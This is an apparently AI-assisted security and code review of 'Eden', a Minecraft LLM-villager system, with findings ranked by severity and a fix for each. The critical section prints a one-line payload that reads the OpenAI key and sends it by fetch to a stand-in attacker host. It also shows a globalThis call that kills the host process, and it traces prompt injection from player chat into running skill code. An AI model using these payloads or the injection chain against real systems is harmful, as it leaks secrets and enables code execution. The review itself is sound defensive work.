# Eden — Deep Review Findings

Executed against the plan in [REVIEW-PLAN.md](REVIEW-PLAN.md), fanned out across 8 parallel review
agents (engine, loop, God/library, villager runtime, journal/views, bots/fakes, social/admin/config,
security), then synthesized with an adversarial-verify pass on the top findings (the verifier re-read
the cited code rather than trusting agent output — three findings were re-calibrated and one of the
plan's own seed hypotheses was refuted; see notes).

**Severity:** Critical = wedge/crash host, corrupt journal, exfil key. High = wrong verdicts / breaks
loop convergence / silently drops durable behavior. Medium = claim↔code drift on a load-bearing
invariant. Low/Nit. **Confidence:** Confirmed (code verified) vs Hypothesis (needs a live run).

## Headline

The codebase is unusually disciplined (clean deps, ~94% line coverage, exhaustive docs). The defects
are therefore not sloppiness — they cluster in three places the architecture's own posture predicts:

1. **The skill sandbox is porous in ways the docs label "by design" but never cost out** — a single
   LLM-authored (or chat-injected) skill can exfiltrate the API key, kill the host, or run arbitrary
   code. (CRIT-2/3/4)
2. **Mechanisms that are fully *described* are only partially *wired*** — reactivity reflexes, the
   social subsystem, the density/token-budget invariant, probation re-judging, QA persistence,
   `combineDesks`, `verifyHashes`. CI is green because the tests exercise the parts that exist. (HIGH/MED cluster)
3. **The critic judges a near-empty world** because `captureSnapshot` is stubbed — so verdict quality
   on any non-inventory task rests on the skill's self-report. (HIGH-1)

---

## CRITICAL

### CRIT-1 — Recursive / microtask-only skills permanently wedge the single host
- **Location:** `src/skills/instrument.ts:136-157` (loop-only AST injection), `src/skills/engine.ts:270-287` (canary wiring).
- **Claim:** the loop-budget + `checkProgress` canary is "the only in-process answer to a SYNCHRONOUS `while(true)` that would freeze the whole host" / "the only unstarvable path" (instrument.ts:1-9, 250-252).
- **Reality:** `__loopBudget()` (which runs the gap-W canary) is injected ONLY into `While/DoWhile/For/ForIn/ForOf` bodies. A skill written as `async function rec(n){ await Promise.resolve(); return rec(n+1); }` has no loop node → no budget call, no canary; the `await` resets the budget via `__aw` and only yields to the **microtask** queue, starving every macrotask timer (wallTimer, heartbeat, StallDetector). The engine agent reproduced this empirically (heartbeat printed 0 beats, run never returned). Verified at the AST level by the reviewer.
- **Impact:** one ordinary recursive skill (a very common LLM idiom) freezes the whole process — all bots disconnect, journal stops, loop dies. The exact farm-wheat-wedge class, via recursion instead of a loop, and drafts run unjudged so the critic veto offers no protection.
- **Confidence:** Confirmed.
- **Fix:** inject `__loopBudget()` at the top of every `FunctionDeclaration`/`FunctionExpression`/`ArrowFunctionExpression` body too. Real defense-in-depth: run skills on a killable worker thread.

### CRIT-2 — `globalThis.process.exit/.kill/.abort` bypasses the D-08 host-killer denylist
- **Location:** `src/skills/instrument.ts:56` (frozen 4-method denylist), `:200-214` (compile wrapper shadows only the *local* `process`).
- **Claim:** the shim "neuters EXACTLY these four `process` methods" so "the host process stays alive" (instrument.ts:50-56; deliverable test `skills-instrument.test.ts`).
- **Reality:** the wrapper does `const { process, require, … } = __shim` — it shadows only the bare identifier. `globalThis` is untouched, so `globalThis.process.exit(1)` calls the real process. The header comment admits `globalThis.process` is reachable "BY DESIGN" but frames it only as a sandbox-escape curiosity, never as defeating the host-kill guarantee the D-08 test "proves." Verified by the reviewer (instrument.ts:205-208).
- **Impact:** the denylist stops only the naive `process.exit()`. Host-kill is fully reachable; the D-08 protection the test asserts does not hold. Resource exhaustion (`setInterval`+`Buffer.alloc`) is also uncovered — those are macrotasks, so the macrotask-starvation canary specifically does *not* catch them.
- **Confidence:** Confirmed.
- **Fix:** a true fix needs a worker/VM isolate. Cheap partial: stop the docs/test claiming the host stays alive. Track per-run-tree timer/alloc to bound exhaustion.

### CRIT-3 — `OPENAI_API_KEY` is exfiltrable from skill code via `globalThis.process.env`
- **Location:** `src/skills/instrument.ts:200-230` (shim shadows local `process` only); key origin `src/llm/client.ts:224`, `src/main.ts:498`.
- **Claim:** "the key … never written to a config file or the journal"; "the only security boundary is the tier gate (R25)."
- **Reality:** a skill body (validated by a syntax parse only) can run `const k = globalThis.process.env.OPENAI_API_KEY; await fetch('https://attacker/x?k='+k)`. `fetch`, `globalThis`, and dynamic `import('node:fs'/'node:https')` are all untouched globals. The key lives in `process.env` for the whole host lifetime. The docs acknowledge *generic* sandbox escape but never key exfiltration with its blast radius.
- **Impact:** full theft of the paid LLM key (and any other env secret), usable off-host.
- **Confidence:** Confirmed.
- **Fix (cheap, high-value):** read the key once at boot into a closure, then `delete process.env.OPENAI_API_KEY` so `globalThis.process.env.OPENAI_API_KEY` is `undefined` while the client still holds it. Worker isolate is the real fix. At minimum, document this exact reachable expression as an accepted risk.

### CRIT-4 — Untrusted Minecraft chat → villager deliberation → `write_skill` → arbitrary in-process code
- **Location:** ingress `src/villagers/events.ts:150-158` (`chat`→`player-chat`), `:413-415` (`renderTrigger` = `JSON.stringify(event)`, unsanitized) → prompt §2 `src/villagers/context-pack.ts:211-215`; admin ingress `src/admin/server.ts:248-263` (`/prompt`); authoring sink `src/villagers/tools.ts:219-244` (`write_skill` = parse only).
- **Claim:** the critic catches bad skills (D-12, world-delta).
- **Reality:** player-controlled chat text/names flow verbatim into a deliberation prompt; `write_skill` accepts any code that *parses* (no review of the code text); the hostile side-effect runs during `run_skill` **before** any verdict, and an exfil/kill skill can still return `{ok:true}` so the critic sees "success." Chains directly with CRIT-2/3.
- **Impact:** a single chat line is a remote-ish trigger to in-process RCE / key theft / host kill.
- **Confidence:** Confirmed for the data-flow and the absence of any code-text gate; Hypothesis only on whether a given production model complies with a given jailbreak.
- **Fix:** combine with CRIT-3's env-scrub to defang the worst payload; treat raw player text/names as data-only (don't let it drive a `deliberate` escalation by default); document the chain as accepted with its blast radius.

> **Note on the CRIT-2/3/4 cluster:** the design *documents* that "determined escapes remain reachable by
> design; the tier gate is the only boundary." These are therefore not hidden bugs — they are
> under-acknowledged *consequences* of an accepted posture. The finding is twofold: (a) the high-value
> consequences (key exfil, host kill, RCE-from-chat) are never enumerated with blast radius, and (b)
> the single env-scrub mitigation closes the worst path for ~3 lines without abandoning "full mineflayer
> power." For a hobby server with trusted players the residual risk may be fine — but it should be a
> written decision, not an emergent property.

---

## HIGH

### HIGH-1 — The critic is blind to world delta: `captureSnapshot` is stubbed
- **Location:** `src/skills/engine.ts:587-607`; consumed `god/critic.ts:201`, `render/run-report.ts:26-29`; villager twin `main.ts:597-609`.
- **Claim:** the critic "judges WORLD DELTA (R34/R35) … reads the before/after snapshots" (critic.ts:11, critic.md).
- **Reality:** `captureSnapshot` hardcodes `biome:'unknown'`, `time:0`, `equipment:[]`, `nearbyEntities:[]`, `nearbyBlocks:[]`, `knownChests:[]`. Only position/health/hunger/inventory are live. The deterministic `check` rail reads only `worldAfter.inventory` (so item-count tasks work), but the LLM critique sees an identical empty scene every run.
- **Impact:** any task judged on structure/combat/position/equipment (build, defend, explore, equip) is judged on a dead scene → the critic must trust the skill's self-reported `{ok:true}`. Directly undercuts the "completion ≠ progress" doctrine for all non-item tasks.
- **Confidence:** Confirmed.
- **Fix:** populate from the seam (`bot.time.timeOfDay`, `bot.entities`, `bot.findBlocks`, equipment slots); the FakeBot already models `entities`/`blockAt`/`time`.

### HIGH-2 — The density/token-budget invariant is never enforced on the actual request
- **Location:** `src/llm/client.ts` (never reads `provider.inputTokenBudget` — only a type field at :29); `src/villagers/brain.ts:136-184` (appends up to 16 tool-turns with no re-budget); `src/villagers/context-pack.ts:148-163` (budget gates only history-trim); `src/main.ts:953` (`history: []` hardcoded).
- **Claim:** "the per-tier `inputTokenBudget` is the ceiling … the frame and payload never need trimming in practice" (context-pack.ts:11-14); `kinds.ts:127` "≤ the tier's inputTokenBudget by construction."
- **Reality:** verified — `inputTokenBudget` is consumed in exactly one place (the history-trim loop), `history` is always `[]` in the production rollout, and `LlmClient.chat` POSTs `req.messages` verbatim with no measurement. The frame (capabilities ceiling alone = 16 000 = the entire fast budget) and the within-deliberation growth are never checked.
- **Impact:** a large skill return value, a verbose mineflayer error, or a long multi-turn deliberation overflows the context window → provider 400 (`context_length_exceeded`) → the rollout turn fails, on exactly the hard tasks where revision matters, with no signal pointing at the cause.
- **Confidence:** Confirmed.
- **Fix:** enforce the budget where the request is assembled — cap/trim the accumulated `messages` in `brain.ts`, or have `LlmClient.chat` measure tokens against `inputTokenBudget` and fail loud (S10) before the HTTP call. Bound `renderRunReport`'s value/error/args rendering.

### HIGH-3 — Most reactivity reflexes are dead in production (only hurt/health/death are bridged)
- **Location:** `src/bots/signals.ts:56-85` (emits only `entityHurt`/`health`/`death`) vs the registry rows for `time`/`entitySpotted`/`chat`/`inbox`/`itemReceived`/`blockBrokenNearby`/`runFinished` (`events.ts:138-226`) and the seeded reflexes in `roles.json`.
- **Claim:** `roles.json` seeds `night-falls→go-home`, `player-chat→deliberate`, `inbox→deliberate`, guard `entity-spotted→deliberate`; CLAUDE.md "Reactivity now active for ALL live scenarios."
- **Reality:** verified — signals.ts:14-18 explicitly states the other native sources are "a documented follow-up" and "the unfired router rows stay inert." Only `hurt`/`health-low`/`died` reflexes actually fire. The unit tests pass because they emit raw signals directly onto the FakeBot, bypassing the adapter the live host uses.
- **Impact:** a farmer never auto-harvests at dawn; nobody reacts to a player speaking; the `inbox` reflex never wakes anyone. The "active for ALL scenarios" claim is false for everything except combat/health.
- **Confidence:** Confirmed.
- **Fix:** forward the remaining native sources onto the bus (`bot.on('time')`, entity poll, `bot.on('chat')`, `playerCollect`, inbox-delivery), or drop the unbridged rows from `roles.json` and have `seedRoleDefaults` warn when seeding an event with no live emitter.

### HIGH-4 — The entire social subsystem (trade + conversation) is unreachable dead code
- **Location:** verified — `grep 'new (TradeService|Conversation|SettlementClient)'` returns only `main.ts:577 void new SettlementClient(...)`. `TradeService` (`social/trade.ts`) and `Conversation` (`social/conversation.ts`) are never instantiated; the villager tool surface (`tools.ts`) has no `say`/`trade`/`propose` tool and no stock skill calls them.
- **Claim:** trade.ts/conversation.ts headers describe being wired from main.ts and called from the brain; docs describe trade settlement + bot↔bot chat + relations as features.
- **Reality:** trade settlement, the chat mirror, eavesdrop memory, and relation movement are entirely non-functional in a real run despite being fully built and CI-tested. (`relations()` is therefore always empty; the R69 "conversation→memory unwired" note is the same root.) Even the lone `void new SettlementClient` doesn't validate the URL at construction, so its "fail-fast" rationale is also moot.
- **Impact:** large claim↔reality divergence, and a latent security footgun the moment someone wires a `trade`/`say` tool without re-auditing those now-live paths.
- **Confidence:** Confirmed.
- **Fix:** either wire a `propose_trade`/`say` tool (and re-audit), or guard the social modules as "M6 deferred" and say so. Make the SettlementClient fail-fast real (`new URL(...)` at construction).

### HIGH-5 — The combat scenario is the least-proven live path (fakes can't exercise it)
- **Location:** `src/skills/exemplars/index.ts:330-336` (`kill-mob` uses `bot.entity.position.distanceTo`, `bot.pvp.attack`, `target.isValid`), `:749-763` (`defend-self`); `src/bots/plugins.ts:62-79` (armor-manager loaded as a swallowed side-effect, R16).
- **Reality:** FakeBot's `entity.position` is a plain `{x,y,z}` (no `.distanceTo`), has no `pvp.attack`, and entities have no `isValid`; the one CI test that fires `defend-self` seeds zero entities, so `kill-mob` is never entered — every line of it is dead in CI. Separately, if `mineflayer-armor-manager` throws on load (1.21.1 mismatch), `bot.armorManager` is silently undefined and every `armorManager?.pause()` no-ops — invisible to the fakes (which hardcode a working manager). `kill-mob` is also the one stock skill still using `.distanceTo` instead of `Math.hypot`, inconsistent with the rest of the library.
- **Impact:** cooperative-mob-defense (the richest live scenario) carries the most unmodeled real surface — the W/Z/C/E "fakes-passed/real-broke" signature.
- **Confidence:** Confirmed at code level; live failure is a Hypothesis.
- **Fix:** rewrite `kill-mob` distance with `Math.hypot`; teach FakeBot a `pvp.attack` that flips `isValid` and seed entities in a test that reaches `kill-mob`; assert load-bearing plugins (pvp, armorManager) are present after load and journal a `system.error` (not a warn) when a combat plugin is missing.

### HIGH-6 — Admin API (8770) is unauthenticated → a second RCE path that doesn't need Minecraft
- **Location:** `src/admin/server.ts:129-136` (binds 127.0.0.1, no auth), `:230-301` (mutating verbs incl. `/villagers/:name/prompt`), `:309-320` (`readBody` JSON-parses any body regardless of content-type).
- **Claim:** "localhost HTTP … mutating verbs journal actor before acting" — loopback bind treated as the boundary (owner #9).
- **Reality:** no token / Origin / CSRF check anywhere. `POST /prompt {text}` injects arbitrary text into a villager's inbox → the CRIT-4 chain, without needing Minecraft access. Because `readBody` JSON-parses any body, a `text/plain` form-POST from a malicious page the operator visits is a plausible drive-by CSRF; any other local process has unrestricted control (pause, quarantine, start/stop scenarios, read the full journal + WS stream).
- **Impact:** unauthenticated local control of the village, and a browser-reachable amplifier of CRIT-4.
- **Confidence:** Confirmed (no auth exists); the browser-CSRF specifics are a Hypothesis.
- **Fix:** boot-generated bearer token on mutating verbs + an `Origin`/`Host` allowlist; or document that the host must run single-user-trusted and that the CRIT-4 blast radius extends to anything that can reach :8770. (Also cap `readBody` size — LOW-3.)

---

## MEDIUM

- **MED-1 — `validateArgs`/`validateReturn` are shallow/non-recursive** (`engine.ts:631-683`). Only top-level `type`+`required`; no nested `properties`, array `items`, `enum`, min/max, `additionalProperties`; `matchesType` returns true for any absent type. Mistyped nested args fail deep in mineflayer instead of at a "readable boundary error" — contradicting the D-04 promise. *Confirmed.*
- **MED-2 — Probation graduation counts clean exits, never re-judges; admit is decoupled from success** (`engine.ts:412-422`, `library.ts:156-169`, `god.ts:166-176`, `critic.ts:229-249`). The comment self-admits the D-12 "re-review" rail is unbuilt — graduation is 3 clean *exits* (engine's didn't-throw flag), not 3 critic verdicts. Separately, a `{success:false, libraryAction:'admit'}` verdict *does* admit (to `active-probation`) because no rail couples success→admit (only check-veto and divine-overreach downgrade admit). **Calibrated down from the agent's "High":** admission is to probation only (runnable/retrievable, not composable), so blast radius is bounded — but chained with the stub snapshot (HIGH-1), a no-op skill that exits clean 3× can graduate to `active` and become a village-wide composition dependency. *Confirmed.*
- **MED-3 — The "trim oldest-first revision turns" density mechanism is test-only** (`main.ts:953` `history: []`). Production carries only the latest revision via the `density` payload; the documented multi-revision memory + the config reserve-floor reasoning describe behavior that never runs. *Confirmed.*
- **MED-4 — `library.verifyHashes()` is documented as a boot integrity step but never called** (`library.ts:84,287-298`; absent from `main.ts`). The tamper/corruption tripwire (drifted code hash → quarantine) is inert; a corrupted skill body runs unguarded. *Confirmed.*
- **MED-5 — `seedStockSkills` appends a new version of every stock skill on every boot** (`main.ts:522-524`, `library.ts:129-137,351-353`). `upsertDraft` always mints `max+1` + a new file. The "harmless re-assert" comment is wrong; this is the documented 173→27 dedup symptom, regrowing every crash-only/pm2 respawn. *Confirmed (matches project memory).* Fix: no-op when the newest version's `codeHash` already equals `sha256(input.code)`.
- **MED-6 — The Voyager QA cache is in-memory only despite "persisted … forever after" claims** (`curriculum.ts:158`). Nothing writes/reloads it; every restart wipes the accumulated handbook and re-spends fast-tier tokens on already-answered questions (a D-13/R49 cost lever that silently resets). *Confirmed.*
- **MED-7 — `combineDesks` cheap-mode is dead config** (`config.ts:60,107,274`, set `true` in `scenarios/trading-post.json`; no reader in `god/**`/`main.ts`). The three desks always make three calls; the documented cost lever does nothing and its tests only assert the flag round-trips. *Confirmed.*
- **MED-8 — Failed LLM calls are never journaled** (`llm/client.ts:294-296,320-334`). `llm.call` is appended only after a 2xx parse; timeouts/HTTP-errors throw and journal nothing. The journal-as-cost/throughput-oracle under-counts usage and is blind to error/timeout rates — a provider outage looks like quiet. *Confirmed.*
- **MED-9 — An LLM error leaves a `brain.wakeup` with no `brain.done`** (`brain.ts:110,137,187`). The deliberation loop has no try/finally; a `client.chat` throw unwinds past the `brain.done` append, leaving dangling deliberations in the journal/replay (doubly invisible with MED-8). *Confirmed module-level; whether anything upstream closes it is a Hypothesis.*
- **MED-10 — R32 memory quarantine has no resolution path** (`memory.ts:218-244`; no caller in `main.ts`/`admin/server.ts`). Quarantine engages on world-regen but `resolveQuarantine`/`isQuarantined` have zero non-test callers and there's no admin wipe|migrate verb — so a regen silently makes a villager amnesiac forever (the exact R32 failure it was written to prevent). *Confirmed.*
- **MED-11 — Context-pack section ceilings (sum ~24k, capabilities alone 16k) can exceed the fast-tier 16k budget; the reserve invariant is validated for the strong tier only** (`context-pack.ts:93-102,150-163`, `config.ts:355`). Mitigated today only incidentally (reactive wakeups set `includeExemplarCode:false`). Related to HIGH-2. *Confirmed math; live impact a Hypothesis.*
- **MED-12 — `journal.retentionDays` is half-wired** (`config.ts:333,340`). It's omitted from the journal known-key list (so it warns as an unknown key) AND hardcoded to the default (so the value is ignored) — worse than either clean option. *Confirmed.*
- **MED-13 — The avatar-runs-mortal interceptor is a cosmetic chat filter, not a capability boundary** (`engine.ts:289-293`, `hardening.ts:135-144`). When the op'd avatar runs villager-authored (injectable) code, only a `bot.chat` string filter drops `/`-commands — the skill body can restore `bot.chat` or call `bot._client.write(...)`. Contradicts "R25 is the only boundary and it is airtight." (Mortal→divine via run/compose/retrieve is correctly blocked — verified.) *Confirmed mechanism; production reachability a Hypothesis.*
- **MED-14 — Orchestrator `dispatch` uses `tool_choice:'auto'`** (`orchestrator.ts:140-150`) — the same R68 narration-as-text failure the curriculum and critic were forced off of. An empty dispatch silently drops the directive's reason/priority (the loop tolerates it via the `task.goal` fallback, hence not High). *Confirmed; model-dependent firing is a Hypothesis.*

---

## LOW / NIT

- **LOW-1 — `GET /journal?ref=` full-scans** (`journal.ts:107-109` uses `json_each(...).value`, which can't use the `json_extract` expression indexes at `:62-64`). The three indexes are dead weight; ref lookups are O(table) on the unbounded journal. *Confirmed.*
- **LOW-2 — Admin quarantine journals `skill.quarantine{version:-1}` before the existence check** (`admin/server.ts:242-245`) → a phantom audit event for an unknown skill (the sibling `/prompt` handler checks first — the right pattern). *Confirmed.*
- **LOW-3 — `readBody` is unbounded** (`admin/server.ts:309-320`) → a single oversized local POST can OOM the one-process host. *Confirmed.*
- **LOW-4 — `pause`/`resume` overload `system.config-warning`** (`admin/server.ts:293-301`), polluting the channel meant for config-parse warnings. *Confirmed.*
- **LOW-5 — Config JSON parse errors don't name the file** (`config.ts:392`, `scenario-loader.ts:103`, `providers.ts:41`) — fails loud (good) but without the path (S10 drift). *Confirmed.*
- **LOW-6 — `BotRunQueue.currentAbort` has a dead `cause` param** (`engine.ts:459-481`); also a latent priority inversion if multiple non-interrupt runs ever queue on one bot. *Confirmed.*
- **LOW-7 — `void pool.start()` can surface an unhandled rejection** when `installProcessGuards` is off (`main.ts:433`, `village-launch.ts:81,105`) — `stampWorldId` does sync FS that can throw before any try/catch. *Hypothesis.*
- **LOW-8 — `subscriptions.setEnabled` mutates+persists without journaling** (`subscriptions.ts:107-112`) — breaks "every mutation journals" (P4); latent (no live caller yet). *Confirmed.*
- **LOW-9 — `snapshotVitals` appends inside an unguarded `setInterval`** (`pool.ts:260-273`) — a DB-write throw escapes the timer; vitals are explicitly droppable so a try/catch-and-continue is defensible here. *Hypothesis.*
- **LOW-10 — Skill code can settle trades out-of-band** by `fetch`-ing `:8767` directly, bypassing the in-process typed-offer protocol; actual theft is gated by the (unreviewed, Java-side) mod validation. Confirm the `:8767` listener authenticates the requester / validates `from`. *Hypothesis (bounded by mod side).*

---

## Verified clean (checked and NOT a problem — don't re-report)

- **The journal write path is loud, not swallowed.** *(Refutes a REVIEW-PLAN seed hypothesis.)* The `catch {}` at `journal.ts:146` wraps the consumer `fan()` dispatch, not the insert; `insertStmt.run(...)` at `:78` is unwrapped and throws loud. WAL + `synchronous=NORMAL` confirmed.
- **Fold parity holds for all five derived views** — live fold and `rebuild-stats` replay agree (ULID id-order = append-order for same-ms ties); `rebuild-stats.test.ts` asserts `deepEqual`, not just "runs."
- **R44 holds** — pulses are pure in-memory counters; no per-tick stream reaches the journal. **Lag monitor** is armed at construction (sidesteps the `monitorEventLoopDelay` footgun) and fires on `max ≥ 1000ms`.
- **Engine timer cleanup + abort order are correct** — all five timers cleared on every `executeTree` exit; the R4/R5 abort sequence (collectblock→pvp→pathfinder stop()→setGoal(null)→window→settle) is correct; no unhandled rejection on the abort path.
- **Tier gate (mortal→divine) is solid** at run/compose/retrieve — divine skills are invisible to mortal retrieval; `maxSkillLines=400` enforced as decompose-or-reject; quarantine self-heals to probation (never straight to active); the failure tripwire re-arms per streak (no permanent gag).
- **Pool identity (R66)** — handlers guard `rec.bot !== bot`; 4s stagger + `stopping`-reset correct; no reconnect listener leak (per-instance `_client`). Plugin named-imports (R15) resolve correctly under the ESM loader.
- **Secret hygiene** — config never stores the key (only the env-var *name*); `system.boot` is redacted; `debugPrompts` transcripts dump the request body only (no Authorization header → no key) and `readLlmTranscript`/`serveStatic` have traversal guards. (Transcripts *do* contain untrusted prompt/PII content served unauthenticated — see HIGH-6.)
- **Identity uniqueness (R12)** — `assertIdentity` throws on duplicate/again-after-scenario; the empty-pre-scenario gap is closed. **Website is a pure consumer** — `mock-api.js` gone, `api.js` the sole source, `KIND_DOMAINS`/`eventMsg` match `kinds.ts`. The Eden admin server offers no breaking h2c upgrade (the `HTTP_1_1` pin belongs on the Java caller).
- **Event hysteresis is real in-emitter** (`health-low`/`night-falls` latch + re-arm); subscriptions are genuinely data-driven (P5) and `notWhileRunning` reads live `runningSkills`; `run_skill` is the only world-effect tool (P2); the D-15 `hurt→defend-self` override ordering is correct.

---

## Suggested fix order

1. **CRIT-3 env-scrub** (3 lines, closes the worst security path) → decide & document the CRIT-2/3/4 posture.
2. **CRIT-1 widen loop-budget injection to function bodies** (or move skills to a worker — also fixes CRIT-2's host-kill).
3. **HIGH-1 populate `captureSnapshot`** (unblocks honest verdicts for non-item tasks) and **HIGH-2 enforce the token budget at the request** (unblocks hard-task convergence).
4. **HIGH-3 bridge the remaining reflex signals** (or trim `roles.json` + the "active for ALL scenarios" claim).
5. Decide HIGH-4 (wire social, or mark deferred) and HIGH-6 (admin auth).
6. The MED cluster is mostly small claim↔code reconciliations (S8: fix the code or fix the doc, same commit).
